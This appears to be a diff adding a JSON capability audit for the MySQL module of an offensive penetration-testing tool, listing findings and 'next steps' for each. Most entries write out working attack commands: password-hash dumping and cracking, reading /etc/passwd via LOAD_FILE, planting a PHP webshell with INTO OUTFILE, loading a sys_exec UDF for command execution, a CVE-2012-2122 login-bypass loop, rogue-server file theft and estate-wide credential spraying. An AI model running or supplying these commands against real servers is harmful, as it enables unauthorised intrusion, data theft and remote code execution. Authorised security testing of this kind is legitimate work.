@@ -1,0 +1,146 @@
+{
+  "service": "mysql",
+  "module_files": [
+    "recce/services/db/mysql.py"
+  ],
+  "summary": "Mature module (866 LOC) \u2014 native MySQL protocol handshake, empty-password / anonymous root probe with full AuthSwitch and caching_sha2 negotiation, native_password credentialed authenticate(), server_version + CLIENT_SSL parsing, mysql.user hash dump, FILE-priv/plugin_dir/secure_file_priv/local_infile recon, loaded UDF (mysql.func) detection, information_schema-driven datamine with redacted samples + connection-string harvest, banner-driven CVE correlation (three CVEs, MySQL + MariaDB). Biggest gap: no active file-read proof via LOAD_FILE (would upgrade file_priv to T2); UDF-load-and-execute chain (writing lib_mysqludf_sys.so via SELECT INTO DUMPFILE) is left to the operator; no credential-spray on failed auth beyond the supplied engagement creds.",
+  "proposed_shared_surface_consumers": [
+    "known_users",
+    "known_creds",
+    "known_hashes",
+    "known_hostkeys"
+  ],
+  "findings": [
+    {
+      "kind": "mysql_empty_password",
+      "tier": "t2",
+      "severity": "high",
+      "title_pattern": "MySQL '<user>' login with empty password",
+      "tier_evidence": "_login_empty successfully runs HandshakeResponse41 with zero-length auth response + follows AuthSwitch/caching_sha2 MoreData; only fires on 0x00 OK packet. Then loot() actually queries mysql.user and pulls hashes \u2014 proof of access + read.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Wire the socket returned from _login into an interactive shell handoff (subprocess into the mysql client with -p '' inherited env or connect via mysql_binary), storing the persistent connection handle in the session for follow-up ops.",
+      "promotion_risk": "medium",
+      "tester_next_step": "mysql -h <ip> -P <port> -u root -e 'SELECT user,host,authentication_string FROM mysql.user'; hashcat -m 300 hashes.txt rockyou.txt.",
+      "related_cves": []
+    },
+    {
+      "kind": "mysql_cred_access",
+      "tier": "t2",
+      "severity": "high",
+      "title_pattern": "MySQL credentialed access (looted / weak credential)",
+      "tier_evidence": "authenticate() with real native_password scramble against greeting salt \u2014 landed cred is proven by 0x00 OK. loot() then dumps mysql.user + FILE-priv state under that identity.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Same as empty-pw: bind an interactive shell + auto-drop a webshell via INTO OUTFILE if FILE priv held and secure_file_priv permits.",
+      "promotion_risk": "high",
+      "tester_next_step": "mysql -h <ip> -P <port> -u <user> -p; then \\u mysql; SELECT * FROM user; check GRANTS for FILE/SUPER; if FILE, LOAD_FILE('/etc/passwd') and SELECT ... INTO OUTFILE '/var/www/html/s.php'."
+    },
+    {
+      "kind": "mysql_local_infile",
+      "tier": "t1",
+      "severity": "medium",
+      "title_pattern": "MySQL server allows LOAD DATA LOCAL (client-file read chain)",
+      "tier_evidence": "SELECT @@local_infile returns 1 / ON \u2014 deterministic server config assertion.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Bundle a tiny rogue-mysql-server shim (accept the greeting, send a Local Infile request with a chosen filename) and demonstrate the chain by having recce reconnect to itself as a client \u2014 proof the primitive works, without needing a real app SQLi.",
+      "promotion_risk": "medium",
+      "tester_next_step": "python3 rogue-mysql-server.py -f /etc/passwd; then coerce any client (SQLi in app that uses this DB) to connect with local_infile=1; captured file lands in your rogue server output."
+    },
+    {
+      "kind": "mysql_file_priv",
+      "tier": "t1",
+      "severity": "high",
+      "title_pattern": "MySQL FILE privilege (arbitrary file read/write -> RCE)",
+      "tier_evidence": "SHOW GRANTS parsed for FILE / ALL PRIVILEGES ON *.* + @@secure_file_priv + @@plugin_dir \u2014 deterministic proof of held privilege. Actual file read/write is not attempted.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Actually execute SELECT LOAD_FILE('/etc/hosts') (universally-present canary) and attach first 64 bytes as proof \u2014 mirrors mssql_openrowset_read pattern already in the mssql module.",
+      "promotion_risk": "low",
+      "tester_next_step": "mysql -h <ip> -P <port> -u <u> -p -e \"SELECT LOAD_FILE('/etc/passwd')\"; if secure_file_priv empty + plugin_dir writable, wget lib_mysqludf_sys.so, SELECT ... INTO DUMPFILE '<plugin_dir>/l.so', CREATE FUNCTION sys_exec RETURNS INT SONAME 'l.so'; SELECT sys_exec('id')."
+    },
+    {
+      "kind": "mysql_datamine",
+      "tier": "t3",
+      "severity": "high",
+      "title_pattern": "MySQL sensitive data exposed (PII / secrets / credentials)",
+      "tier_evidence": "datamine() actually SELECTs matching sensitive columns and returns redacted samples + regex-harvested connection strings \u2014 real data is exfiltrated (redacted) and creds are stored in looted list.",
+      "can_promote_to": "t4",
+      "promotion_notes": "Feed harvested embedded connection strings back into recce's credential spray across every mysql/postgres/http target \u2014 turns one DB's stored creds into estate-wide access.",
+      "promotion_risk": "low",
+      "tester_next_step": "mysql -h <ip> -P <port> -u <u> -p -e 'SELECT * FROM <db>.<table> LIMIT 20'; sanitize + reuse embedded creds against every discovered service."
+    },
+    {
+      "kind": "mysql_udf_loaded",
+      "tier": "t1",
+      "severity": "critical",
+      "title_pattern": "MySQL command-execution UDF already loaded (instant RCE)",
+      "tier_evidence": "SELECT name,dl FROM mysql.func matched against _UDF_RCE_NAMES / 'mysqludf_sys' \u2014 deterministic proof of RCE primitive presence. Does not invoke sys_eval to confirm output.",
+      "can_promote_to": "t2",
+      "promotion_notes": "SELECT sys_eval('id') under the current session and capture the returned bytes as proof \u2014 turns capability into confirmed foothold.",
+      "promotion_risk": "medium",
+      "tester_next_step": "mysql -h <ip> -P <port> -u <u> -p -e \"SELECT sys_eval('id')\"; then whoami + hostname; check for docker / suid on the mysqld process for host escape."
+    },
+    {
+      "kind": "mysql_udf_inventory",
+      "tier": "t0",
+      "severity": "low",
+      "title_pattern": "MySQL loaded UDF(s) present (privesc surface)",
+      "tier_evidence": "SELECT name,dl FROM mysql.func returned non-RCE-named UDFs \u2014 enumeration of a privesc surface without any exploit proof.",
+      "can_promote_to": "t1",
+      "promotion_notes": "Read the backing .so name and match against a shipped catalogue of known-vulnerable UDFs; upgrade severity when the library name resolves to something exploitable.",
+      "promotion_risk": "none",
+      "tester_next_step": "mysql> SELECT name,dl FROM mysql.func; ldd on the .so on the DB host; grep for exec/system/popen \u2014 otherwise treat as informational."
+    },
+    {
+      "kind": "mysql_cve_cve_2012_2122",
+      "tier": "t0",
+      "severity": "critical",
+      "title_pattern": "Mysql <ver> vulnerable to CVE-2012-2122",
+      "tier_evidence": "Banner-driven version comparison against 5.1.61/5.5.22/5.6.5 ceilings within the same major.minor train \u2014 a banner assertion, no attempt to exercise the memcmp() bypass.",
+      "can_promote_to": "t1",
+      "promotion_notes": "Actually run the CVE-2012-2122 exploit loop: for i in {1..300}; do mysql -u root -pWRONG -h <ip>; done \u2014 a landed login proves vulnerable glibc build.",
+      "promotion_risk": "medium",
+      "tester_next_step": "for i in $(seq 1 500); do mysql -u root -h <ip> --password=WRONG -e 'SELECT 1' 2>/dev/null && echo HIT && break; done. If HIT, dump mysql.user hashes.",
+      "related_cves": [
+        "CVE-2012-2122"
+      ]
+    },
+    {
+      "kind": "mysql_cve_cve_2016_6662",
+      "tier": "t0",
+      "severity": "high",
+      "title_pattern": "Mysql <ver> vulnerable to CVE-2016-6662",
+      "tier_evidence": "Banner-driven version check only; no confirmation the mysqld_safe wrapper is in use or that log-config is writable.",
+      "can_promote_to": "t1",
+      "promotion_notes": "When FILE priv is also held, actually write a malicious my.cnf under $DATADIR and check ownership/perms \u2014 proves prerequisites for the escalation.",
+      "promotion_risk": "high",
+      "tester_next_step": "With FILE priv: SET GLOBAL general_log_file='/var/lib/mysql/my.cnf'; SET GLOBAL general_log=1; INSERT trigger crafted [malloc_lib] block; check /proc for mysqld_safe.",
+      "related_cves": [
+        "CVE-2016-6662"
+      ]
+    },
+    {
+      "kind": "mysql_cve_cve_2021_2154",
+      "tier": "t0",
+      "severity": "medium",
+      "title_pattern": "Mysql <ver> vulnerable to CVE-2021-2154",
+      "tier_evidence": "Banner match only \u2014 post-auth DoS, banner insufficient to guarantee exploitability.",
+      "can_promote_to": "stay",
+      "promotion_notes": "DoS PoCs are destructive; leave at banner-tier. Only promote if the operator asks with explicit ROE.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "Do NOT auto-run. Consult Oracle CPU April 2021 advisory + MySQL 5.7.34/8.0.23 changelog for the partitioning DML PoC.",
+      "related_cves": [
+        "CVE-2021-2154"
+      ]
+    },
+    {
+      "kind": "mysql_no_tls",
+      "tier": "t1",
+      "severity": "medium",
+      "title_pattern": "MySQL does not offer TLS (credential sniffing)",
+      "tier_evidence": "Server greeting parsed \u2014 CLIENT_SSL flag absent from cap bytes. Deterministic server-side assertion.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Verification would require actually sniffing a live auth \u2014 out of scope.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "On-path sniff of native_password scramble; capture with tcpdump + mysql_scramble cracker (hashcat -m 11200)."
+    }
+  ]
+}
